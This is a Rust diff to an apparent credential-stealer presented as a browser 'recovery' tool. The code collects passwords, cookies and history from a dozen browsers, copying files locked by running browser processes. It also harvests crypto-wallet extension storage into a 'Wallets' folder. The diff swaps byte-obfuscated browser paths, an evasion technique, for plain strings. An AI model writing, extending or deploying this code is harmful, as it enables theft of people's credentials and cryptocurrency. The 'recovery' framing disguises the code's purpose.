@@ -1,6 +1,5 @@
 use crate::recovery::context::RecoveryContext;
 use crate::recovery::fs::copy_dir_limited;
-use crate::recovery::helpers::obfuscation::deobf;
 use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
 use async_trait::async_trait;
 use std::collections::HashSet;
@@ -201,23 +200,42 @@ impl RecoveryTask for BrowserRecoveryTask {
                             | BrowserDataKind::History
                             | BrowserDataKind::Passwords
                     ) {
-                        let temp_dir = ctx
+                        let browser_dir = ctx
                             .output_dir
-                            .join("browsers")
-                            .join(self.profile.browser.label());
-                        let _ = std::fs::create_dir_all(&temp_dir);
-                        let dest = temp_dir.join(format!(
-                            "{}_{}_{}",
-                            self.profile.profile_name,
-                            self.kind.label(),
-                            file_name
-                        ));
+                            .join("Browsers")
+                            .join(self.profile.browser.label())
+                            .join(&self.profile.profile_name);
+                        let _ = std::fs::create_dir_all(&browser_dir);
+
+                        let extension = Path::new(file_name)
+                            .extension()
+                            .and_then(|ext| ext.to_str())
+                            .unwrap_or("db");
+
+                        let dest = browser_dir.join(format!("{}.{}", self.kind.label(), extension));
 
                         if super::lockedfile::copy_locked_file(
                             self.profile.browser.process_name(),
                             &candidate,
                             &dest,
                         ) {
+                            final_path = dest;
+                        }
+                    } else {
+                        let browser_dir = ctx
+                            .output_dir
+                            .join("Browsers")
+                            .join(self.profile.browser.label())
+                            .join(&self.profile.profile_name);
+                        let _ = std::fs::create_dir_all(&browser_dir);
+
+                        let extension = Path::new(file_name)
+                            .extension()
+                            .and_then(|ext| ext.to_str())
+                            .unwrap_or("txt");
+
+                        let dest = browser_dir.join(format!("{}.{}", self.kind.label(), extension));
+                        if let Ok(_) = fs::copy(&candidate, &dest).await {
                             final_path = dest;
                         }
                     }
@@ -347,16 +365,12 @@ impl RecoveryTask for BrowserExtensionTask {
         for (name, id) in target_ids {
             let extension_settings_dir = local_ext_settings.join(&id);
             if fs::metadata(&extension_settings_dir).await.is_ok() {
-                let dest_root = ctx
-                    .output_dir
-                    .join("services")
-                    .join("Wallets")
-                    .join(format!(
-                        "{}_{}_{}_Settings",
-                        self.profile.browser.label(),
-                        self.profile.profile_name,
-                        name
-                    ));
+                let dest_root = ctx.output_dir.join("Wallets").join(format!(
+                    "{}_{}_{}_Settings",
+                    self.profile.browser.label(),
+                    self.profile.profile_name,
+                    name
+                ));
                 let _ = fs::create_dir_all(&dest_root).await;
                 let _ = copy_dir_limited(
                     &extension_settings_dir,
@@ -374,16 +388,12 @@ impl RecoveryTask for BrowserExtensionTask {
                     while let Ok(Some(entry)) = dir.next_entry().await {
                         let fname = entry.file_name().to_string_lossy().to_string();
                         if fname.contains(&id) {
-                            let dest_root =
-                                ctx.output_dir
-                                    .join("services")
-                                    .join("Wallets")
-                                    .join(format!(
-                                        "{}_{}_{}_IndexedDB",
-                                        self.profile.browser.label(),
-                                        self.profile.profile_name,
-                                        name
-                                    ));
+                            let dest_root = ctx.output_dir.join("Wallets").join(format!(
+                                "{}_{}_{}_IndexedDB",
+                                self.profile.browser.label(),
+                                self.profile.profile_name,
+                                name
+                            ));
                             let _ = fs::create_dir_all(&dest_root).await;
                             let _ = copy_dir_limited(
                                 &entry.path(),
@@ -400,16 +410,12 @@ impl RecoveryTask for BrowserExtensionTask {
             }
 
             if fs::metadata(&local_storage).await.is_ok() {
-                let dest_root = ctx
-                    .output_dir
-                    .join("services")
-                    .join("Wallets")
-                    .join(format!(
-                        "{}_{}_{}_Storage",
-                        self.profile.browser.label(),
-                        self.profile.profile_name,
-                        name
-                    ));
+                let dest_root = ctx.output_dir.join("Wallets").join(format!(
+                    "{}_{}_{}_Storage",
+                    self.profile.browser.label(),
+                    self.profile.profile_name,
+                    name
+                ));
 
                 if let Ok(mut dir) = fs::read_dir(&local_storage).await {
                     while let Ok(Some(entry)) = dir.next_entry().await {
@@ -542,16 +548,17 @@ fn find_running_browsers(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> {
     for browser in browsers {
         let pid = super::lockedfile::proc::find_by_name(browser.process_name());
         if pid != 0 {
-            use windows::Win32::Foundation::CloseHandle;
-            use windows::Win32::System::ProcessStatus::K32GetModuleFileNameExW;
-            use windows::Win32::System::Threading::{
+            use windows_sys::Win32::Foundation::CloseHandle;
+            use windows_sys::Win32::System::ProcessStatus::K32GetModuleFileNameExW;
+            use windows_sys::Win32::System::Threading::{
                 OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION,
             };
 
             unsafe {
-                if let Ok(h_proc) = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid) {
+                let h_proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
+                if !h_proc.is_null() {
                     let mut path_buf = [0u16; 1024];
-                    let len = K32GetModuleFileNameExW(h_proc, None, &mut path_buf);
+                    let len = K32GetModuleFileNameExW(h_proc, std::ptr::null_mut(), path_buf.as_mut_ptr(), path_buf.len() as u32);
                     let _ = CloseHandle(h_proc);
 
                     if len > 0 {
@@ -654,100 +661,49 @@ pub fn browser_data_roots(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> 
     vec![
         (
             BrowserName::Chrome,
-            // "Google/Chrome/User Data"
-            ctx.local_data_dir.join(deobf(&[
-                0xFA, 0xCE, 0xCE, 0xDA, 0xDB, 0xD8, 0xAF, 0xFC, 0xCD, 0xCF, 0xD2, 0xDB, 0xD8, 0xAF,
-                0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
-            ])),
+            ctx.local_data_dir.join(r"Google\Chrome\User Data"),
         ),
         (
             BrowserName::Edge,
-            // "Microsoft/Edge/User Data"
-            ctx.local_data_dir.join(deobf(&[
-                0xF0, 0xD4, 0xDE, 0xCF, 0xD2, 0xCE, 0xD2, 0xDB, 0xC9, 0xAF, 0xFC, 0xDB, 0xDA, 0xD8,
-                0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
-            ])),
+            ctx.local_data_dir.join(r"Microsoft\Edge\User Data"),
         ),
         (
             BrowserName::Brave,
-            // "BraveSoftware/Brave-Browser/User Data"
-            ctx.local_data_dir.join(deobf(&[
-                0x9F, 0xCF, 0xDA, 0xC3, 0xD8, 0xA6, 0xD2, 0xDB, 0xDB, 0x8A, 0xDA, 0xCF, 0xCE, 0xAF,
-                0x9F, 0xCF, 0xDA, 0xC3, 0xD8, 0x90, 0x9F, 0xCF, 0xD2, 0xDA, 0x8E, 0xD8, 0xCF, 0xAF,
-                0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
-            ])),
+            ctx.local_data_dir
+                .join(r"BraveSoftware\Brave-Browser\User Data"),
         ),
         (
             BrowserName::Opera,
-            // "Opera Software/Opera Stable"
-            ctx.roaming_data_dir.join(deobf(&[
-                0xFC, 0x8D, 0xD8, 0xCF, 0xDA, 0xE1, 0xA6, 0xD2, 0xDB, 0xDB, 0x8A, 0xDA, 0xCF, 0xCE,
-                0xAF, 0xFC, 0x8D, 0xD8, 0xCF, 0xDA, 0xE1, 0xA6, 0xDB, 0xDA, 0x9F, 0xDB, 0xD8,
-            ])),
+            ctx.roaming_data_dir.join(r"Opera Software\Opera Stable"),
         ),
         (
             BrowserName::Chromium,
-            // "Chromium/User Data"
-            ctx.local_data_dir.join(deobf(&[
-                0xFC, 0xCD, 0xCF, 0xD2, 0xDB, 0xD4, 0xC8, 0xDB, 0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1,
-                0xF1, 0xDA, 0xDB, 0xDA,
-            ])),
+            ctx.local_data_dir.join(r"Chromium\User Data"),
         ),
         (
             BrowserName::Vivaldi,
-            // "Vivaldi/User Data"
-            ctx.local_data_dir.join(deobf(&[
-                0xA1, 0xD4, 0xCC, 0xD4, 0xDB, 0xD3, 0xD2, 0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1,
-                0xDA, 0xDB, 0xDA,
-            ])),
+            ctx.local_data_dir.join(r"Vivaldi\User Data"),
         ),
         (
             BrowserName::Yandex,
-            // "Yandex/YandexBrowser/User Data"
-            ctx.local_data_dir.join(deobf(&[
-                0xA2, 0xD4, 0xCF, 0xD3, 0xCE, 0xDF, 0xAF, 0xA2, 0xD4, 0xCF, 0xD3, 0xCE, 0xDF, 0x9F,
-                0xCF, 0xD2, 0xDA, 0x8E, 0xD8, 0xCF, 0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA,
-                0xDB, 0xDA,
-            ])),
+            ctx.local_data_dir.join(r"Yandex\YandexBrowser\User Data"),
         ),
         (
             BrowserName::ThreeSixty,
-            // "360Browser/Browser/User Data"
-            ctx.local_data_dir.join(deobf(&[
-                0x86, 0x83, 0x85, 0x9F, 0xCF, 0xD2, 0xDA, 0x8E, 0xD8, 0xCF, 0xAF, 0x9F, 0xCF, 0xD2,
-                0xDA, 0x8E, 0xD8, 0xCF, 0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
-            ])),
+            ctx.local_data_dir.join(r"360Browser\Browser\User Data"),
         ),
         (
             BrowserName::QQ,
-            // "Tencent/QQBrowser/User Data"
-            ctx.local_data_dir.join(deobf(&[
-                0x9F, 0xCE, 0xCF, 0x94, 0xCE, 0xCF, 0xDB, 0xAF, 0x84, 0x84, 0x9F, 0xCF, 0xD2, 0xDA,
-                0x8E, 0xD8, 0xCF, 0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
-            ])),
+            ctx.local_data_dir.join(r"Tencent\QQBrowser\User Data"),
         ),
         (
             BrowserName::CocCoc,
-            // "CocCoc/Browser/User Data"
-            ctx.local_data_dir.join(deobf(&[
-                0x90, 0xDA, 0x90, 0x90, 0xDA, 0x90, 0xAF, 0x9F, 0xCF, 0xD2, 0xDA, 0x8E, 0xD8, 0xCF,
-                0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
-            ])),
+            ctx.local_data_dir.join(r"CocCoc\Browser\User Data"),
         ),
         (
             BrowserName::NaverWhale,
-            // "Naver/Whale/User Data"
-            ctx.local_data_dir.join(deobf(&[
-                0xF3, 0xD4, 0xCC, 0xCE, 0xDB, 0xAF, 0x94, 0xDB, 0xD4, 0xDB, 0xCE, 0xAF, 0xA0, 0x8E,
-                0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
-            ])),
+            ctx.local_data_dir.join(r"Naver\Whale\User Data"),
         ),
-        (
-            BrowserName::Arc,
-            // "Arc/User Data"
-            ctx.local_data_dir.join(deobf(&[
-                0xFA, 0xDB, 0x90, 0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
-            ])),
-        ),
+        (BrowserName::Arc, ctx.local_data_dir.join(r"Arc\User Data")),
     ]
 }
